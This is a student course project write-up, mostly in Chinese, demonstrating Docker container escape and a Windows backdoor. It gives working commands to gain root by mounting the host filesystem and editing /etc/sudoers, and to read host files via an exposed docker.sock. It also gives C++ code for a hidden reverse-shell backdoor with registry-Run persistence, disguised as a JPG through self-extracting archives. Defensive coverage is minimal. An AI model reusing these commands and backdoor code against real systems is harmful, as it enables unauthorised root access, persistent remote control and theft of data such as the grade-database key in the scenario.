# Networking & Multimedia Project

Group 10 翁挺瑋 郭律佑 林執晰

# Docker Breakout

設想今天一主機利用 Docker 架設了網站與資料庫等 container，假設網站有漏洞並遭到駭客入侵，工程師能很快的利用 docker 換成新版本進行即時修補維護。但如果是 container 本身存在漏洞，那不僅是網站，所有的資料庫全部都曝露在被惡意程式入侵的風險之中。

這次的 Demo 是假定駭客是網多作業都爆抄同學的，且被當掉後就拿不到畢業證書的同學，而學校成績登陸資料庫密鑰存在一個校方的 host 主機裡。已知這名駭客在該主機的其中一個 docker container 之中，其目的是要逃出 container，入侵到 host 裡頭竊取密碼並竄改成績。

---

## Container Techniques

- Container 運用到有 6 個重要的技術，其中兩個技術與本次實驗 demo 較為相關。

    Namespaces

    Cgroups

    Seccomp

    Capabilities

    LSM

    OverlayFS

### Namespaces

Container 好用的地方在於，它能夠建立一個獨立的環境，可以放心地安裝一大堆想嘗試的套件，不怕弄髒自己的環境。要實現這個功能，Namespaces 扮演了一個很重要的角色。以下截自 Linux Programmer's Manual：

> A namespace wraps a global system resource in an abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource. Changes to the global resource are visible to other processes that are members of the namespace, but are invisible to other processes. One use of namespaces is to implement containers.

這邊的 resource 指的就像 Mount point 或 PID，Namespaces 可以建立一個獨立的 Mount point 或 PID，讓 Container 僅能存取自己掛載的檔案系統或自己的 Process，與 Host 隔離開來，不會弄亂 Host 的檔案，或存取到 Host 的 Process 資訊。

### Cgroups

Cgroups 透過 cgroupfs 控制 Process 所能使用的記憶體容量或 CPU 資源，讓 Process 不會因為一些 bug 讓整台電腦當機，Docker 可以用 --cpu-shares 來限制各個 Container 能用到的 CPU 資源。

---

## Privileged Escalation

```bash
sudo usermod -aG docker evil
su evil

# Should fail
su deluser victim
sudo cat /etc/sudoers

cd 
mkdir privesc
nano Dockerfile

FROM debian:wheezy
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
WORKDIR $WORKDIR

docker build -t privesc . # Inside current directory
docker run -v /:/privesc -it privesc /bin/bash

#Inside container
echo "evil ALL=(ALL) NOPASSWD: ALL" >> /privesc/etc/sudoers
cat /privesc/etc/sudoers
whoami # Success!!

```

---

## Mitigation of Privilege Escalation

![Networking%20&%20Multimedia%20Project%200f84e4b88d00401684d12b773ade1121/Untitled.png](Networking%20&%20Multimedia%20Project%200f84e4b88d00401684d12b773ade1121/Untitled.png)

## Exposed Docker Socket

如果 host 端有 mount `docker.sock` 到 container 當中，我們可以透過 `docker.sock` 去進行 container 脫逃。因為 docker socket 有 docker group，可以執行很多不需要 root 權限的 docker command，我們可以藉由這個權限去執行一些沒有這個 socket 無法執行的程式。

### Docker socket

Docker socket 是一種 UNIX 的通訊端，docker cli 常用此執行 docker 指令，擁有 root 的權限。 `docker.sock` 原本不在 container 裡面，但在 container 裡的使用者有時候為了要管理或者建立別的 container，會需要把它 mount 進來。Mount 進來 container 裡會增加 attack surface 的風險。

![Networking%20&%20Multimedia%20Project%200f84e4b88d00401684d12b773ade1121/Picture1.png](Networking%20&%20Multimedia%20Project%200f84e4b88d00401684d12b773ade1121/Picture1.png)

接下來是實驗 Demo 的流程：

### Victim

在進行攻擊之前得先架設好攻擊環境。用 docker 架好一個名為 "sock" 且含有 docker socket 在裡頭的 container。

```bash
docker run -itd --name sock -v /var/run/docker.sock:/var/run/docker.sock alpine:latest
```

### Intruder

檢查 `docker.sock` 是否在 container 之中，通常路徑是 `/var/run/docker.sock`。

```bash
find / -name docker.sock
```

確定存在之後，進到 sock 的 shell 裡面。

```bash
docker exec -it sock sh
```

在裡面架設一個新的 container ，同時把 host 的 root 路徑 `/` 直接 mount 到新 container 的資料夾 `/test` 裡面後，開啟新 container 的 shell。

```bash
docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh
```

這時會出現 `test` 資料夾，裡面就是 host 的 root 路徑，此時入侵者已經可以在這個新的 container 上，去 access host 裡面的所有檔案及機密資訊。

```bash
cd /test && cat /etc/passwd
```

```bash
dockerd --userns-remap="evil:evil" # This limits the capabilities of evil user
```

## Reference

1. [https://www.netsparker.com/blog/web-security/privilege-escalation/](https://www.netsparker.com/blog/web-security/privilege-escalation/)
2. [https://docs.docker.com/engine/security/userns-remap/](https://docs.docker.com/engine/security/userns-remap/)
3. [https://www.youtube.com/watch?v=MnUtHSpcdLQ](https://www.youtube.com/watch?v=MnUtHSpcdLQ)
4. [https://flast101.github.io/docker-privesc/](https://flast101.github.io/docker-privesc/)
5. [https://operatingsystemsatntu.github.io/OS-21-Spring-at-NTU/mp0.html](https://operatingsystemsatntu.github.io/OS-21-Spring-at-NTU/mp0.html)
6. [https://javascript.plainenglish.io/top-reasons-why-docker-is-popular-31cc6056e82a](https://javascript.plainenglish.io/top-reasons-why-docker-is-popular-31cc6056e82a)
7. [https://www.datadoghq.com/container-report/](https://www.datadoghq.com/container-report/)
8. 

# Windows Backdoor

這其實是一種非常古典的惡意程式。其最終目的便是能在用戶端執行並取得我們想要的結果並能夠在伺服器端獲取這些資料。

其流程大致如下：

1. 建立伺服器，監聽來自特定port
2. 引誘受害者執行後門
3. 後門在cilent跟server間建立連線
4. server端傳輸命令
5. client端執行我們所想要的命令
6. 在server端獲取結果

而想要順利的部署後門，則需要下列四項基本的概念

- 釣魚：引誘使用者執行我們的後門。如偽裝成其他受信任的程式，或者是提供有吸引力的內容。
- 持久化：如何長久的維持這個後門在cilent端正常的運行
- 獲取權限：在windows上，主動的嘗試取得管理者權限。或者是讓受害者給予。
- 躲避偵測：使受害者無法感知到後門的存在。並嘗試躲避防毒軟體或防火牆

## 釣魚

對於此類後門程式來說，如何讓受害者心甘情願的上鉤可能是最為關鍵的一步，在DEMO中我使用的是很老套的偽裝成其他種類的檔案。利用WINRAR知名的自解壓縮設定可以簡單的完成這一步。

(在DEMO中我們偽裝成JPG)

各種角度上來看偽造或注入到受信賴的應用程式會是更好的選項，但我目前作不出來。

## 連線

選擇一個閒置的port，將預先取得的ip跟port封進client端。在兩端建立socket並雙向傳遞資料。

(然而這一步無可避免的需要通過受害者的防火牆，在這份demo只能依賴受害者本身防火牆設定的較鬆散，能夠允許在我們想要的port進行連線)

## 執行與隱蔽

我們偷偷創立一個console，並將其隱藏(但仍在工作管理員可見)

```cpp
AllocConsole(); //產生一個新的console
stealth = FindWindowA("ConsoleWindowClass", NULL); //檢索 1 類別名 2 窗口名
ShowWindow(stealth, 0); //設置nCmdShow為0 隱藏視窗並啟動另一視窗)
```

## 持久化

登錄HEKY到相應的目錄，以實現開機自啟，在Win7下這個目錄是

```cpp
Software\Microsoft\Windows\CurrentVersion\Run
```

而這是在WIN中登錄的方式

```cpp
TCHAR s2Path[MAX_PATH]; 
DWORD pathLen = 0;
pathLen = GetModuleFileName(NULL, s2Path, MAX_PATH); //獲取我們的路徑
HKEY NewVal; //創立一個新的KEY
RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run") //打開開機自啟動的機碼
RegSetValueEx(NewVal, TEXT("Backdoor"), 0, REG_SZ, (LPBYTE)s2Path, pathLenInBytes) //加入
```

## 監聽與傳輸

在兩端建立對接的socket

```cpp
//server端
sock = socket(AF_INET, SOCK_STREAM, 0); 
if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) < 0) {  //設定socket
	printf("Error Setting TCP Socket options!\n");
	return 1;
}
server_address.sin_family = AF_INET;
server_address.sin_addr.s_addr = inet_addr("192.168.56.99"); //kali ip
server_address.sin_port = htons(50008); //port
bind(sock, (struct sockaddr*) &server_address, sizeof(server_address));
listen(sock, 5); //監聽這個socket

//以下是發送並接收我們要的命令
while (1) { 
	bzero(&buffer, sizeof(buffer));
	bzero(&response, sizeof(response));
	printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
	fgets(buffer, sizeof(buffer), stdin);
	strtok(buffer, "\n"); //分解串
	write(client_socket, buffer, sizeof(buffer));
	if (strncmp("q", buffer, 1) == 0) { //離開
		break;
		}
	else if (strncmp("persist",buffer,7) ==0 ) { //建立持久化
		recv(client_socket, response, sizeof(response), 0);
		printf("%S", response);
		}
	else {                              //接收
		recv(client_socket, response, sizeof(response), MSG_WAITALL);
		printf("%S", response);
		}
}
// client端

sock = socket(AF_INET, SOCK_STREAM, 0);
memset(&servaddr, 0, sizeof(servaddr));//填充0
servaddr.sin_family = AF_INET;
servaddr.sin_addr.s_addr = inet_addr(servip); //server的ip
servaddr.sin_port = htons(servport); //指定的port
start:
while (connect(sock, (struct sockaddr *) &servaddr, sizeof(servaddr)) != 0) { //嘗試連接(如果成功返回0)
	Sleep(10);
	MessageBox(NULL, L"no connect", L"connect", MB_OK);
	goto start;
	}
Shell(); //我們要控制的程式

```

## Reference

1. [https://dangerlover9403.pixnet.net/blog/post/212391408-[教學]c++-socket資料整理](https://dangerlover9403.pixnet.net/blog/post/212391408-%5B%E6%95%99%E5%AD%B8%5Dc++-socket%E8%B3%87%E6%96%99%E6%95%B4%E7%90%86)
2. [https://www.youtube.com/watch?v=6Dc8i1NQhCM&t=4973s](https://www.youtube.com/watch?v=6Dc8i1NQhCM&t=4973s)
3. [https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-functions](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-functions)